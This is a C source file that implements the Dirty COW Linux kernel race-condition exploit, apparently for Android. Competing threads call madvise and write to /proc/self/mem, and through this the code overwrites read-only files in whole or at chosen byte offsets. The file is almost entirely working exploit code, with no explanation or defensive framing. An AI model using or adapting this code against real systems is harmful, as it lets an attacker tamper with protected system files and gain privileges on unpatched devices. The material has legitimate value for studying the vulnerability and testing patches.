#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <errno.h>
#include "utils.h"



#define LOOP   0x100000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

typedef struct mem_arg_struct  {
	unsigned char *dest;
	unsigned char *patch;
	size_t patch_size;
} mem_arg;

int bfinish = 0;

void dirtycow_exploit(mem_arg *);

static void madviseThread(void *arg)
{
	mem_arg *ma;
	size_t size;
	void *addr;
	int i;

	ma = (mem_arg *)arg;
	addr = ma->dest;
	size = ma->patch_size;
	for(i = 0; i < LOOP && !bfinish; i++) {
		madvise(addr, size, MADV_DONTNEED);
		if (bfinish) 
			break;
	}
}

static void procselfmemThread(void *arg)
{
	mem_arg *ma = (mem_arg *)arg;
	int fd, i;
	unsigned char *p;
	off_t off;

	p = ma->patch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1){
		LOGE("open(\"/proc/self/mem\"");
		return;
	}
	for (i = 0; i < LOOP && !bfinish; i++) {
		off = lseek(fd, (off_t)ma->dest, SEEK_SET);
		if(off == -1){
			LOGE("[*] lseek error : %s", strerror(errno));
			continue;
		}
		write(fd, p, ma->patch_size);
	}
	close(fd);
}

static void detectFinThread(void * arg)
{
	mem_arg *ma = (mem_arg *)arg;
	while (1){
		if(0 == memcmp(ma->patch, ma->dest, ma->patch_size)){
			bfinish = 1;
			return;
		}
		sleep(1);
	}
}

int dirtycow(const char *dst, const char *src) {

	mem_arg ma;
	struct stat st;
	struct stat st2;

	int f=open(dst,O_RDONLY);
	if (f == -1) {
		LOGE("ERROR: could not open %s", dst);
		return -1;
	}
	if (fstat(f,&st) == -1) {
		LOGE("ERROR: could not open %s", dst);
		return -1;
	}

	int f2=open(src,O_RDONLY);
	if (f2 == -1) {
		LOGE("ERROR: could not open %s", src);
		return -1;
	}
	if (fstat(f2,&st2) == -1) {
		LOGE("ERROR: could not open %s", src);
		return -1;
	}

	size_t size = st.st_size;
	if (st2.st_size != st.st_size) {
		if (st2.st_size > size) {
			size = st2.st_size;
		}
	}

	ma.patch = malloc(size);
	if (ma.patch == NULL)
		LOGE("malloc");

	memset(ma.patch, 0, size);

	read(f2, ma.patch, st2.st_size);
	close(f2);

	ma.patch_size = size;

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		LOGE("mmap");
		return -1;
	}

	ma.dest = map;

	// run the exploit
	dirtycow_exploit(&ma);

	close(f);

	return 0;
}

int dirtycow_memcpy(const char *dst, size_t off, size_t n, void *src) {

	int fd;
	struct stat st;
	unsigned char *map;
	unsigned char *end;
	size_t extra;

	// open destination file
	fd = open(dst, O_RDONLY);
	if( fd == -1 ) {
		LOGE("[!] ERROR: could not open %s\n", dst);
		return -1;
	}

	// get its size 
	if (fstat(fd,&st) == -1) {
		LOGE("[!] ERROR: could not stat %s\n", dst);
		return -1;
	}

	// mmap
	map = (unsigned char *)mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if(map == (void*)-1) {
		LOGE("[!] ERROR: could not mmap %s\n", dst);
		return -1;
	}

	// create the mem_arg struct
	mem_arg ma;
	memset(&ma, 0, sizeof(mem_arg));

	// page align the struct and patch
	ma.dest = map + off;
	end = ma.dest + n;
	extra = (size_t)ma.dest & (size_t)(PAGE_SIZE - 1);
	//LOGI("%s mmap @ %08lx, patch dest : %08lx, end : %08lx, extra : %08lx\n", dst, map, ma.dest, end, extra);
	ma.dest -= extra;
	ma.patch_size = end - ma.dest;
	ma.patch = (unsigned char *)malloc(ma.patch_size);
	//LOGI("ma dest : %08lx, ma.patch_size : %08lx\n", ma.dest, ma.patch_size);

	// create the patch
	memcpy(ma.patch, ma.dest, ma.patch_size);
	memcpy(ma.patch + extra, src, n);
	//LOGI("%s mmap @ %08lx, patch dest : %08lx, size : %08lx, patch_src : %08lx\n", dst, map, ma.dest, ma.patch_size, extra);
	// exploit
	dirtycow_exploit(&ma);

	// cleanup
	munmap(map, st.st_size);
	close(fd);

	return 0;
}

// run the actual exploit
void dirtycow_exploit(mem_arg *ma) {
	pthread_t pth1, pth2, pth3;

	pthread_create(&pth1, NULL, madviseThread, ma);
	pthread_create(&pth2, NULL, procselfmemThread, ma);
	pthread_create(&pth3, NULL, detectFinThread, ma);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	pthread_join(pth3, NULL);

	bfinish = 0;
}


int dirtycow_check_exploitability(void) {



	return -1;

}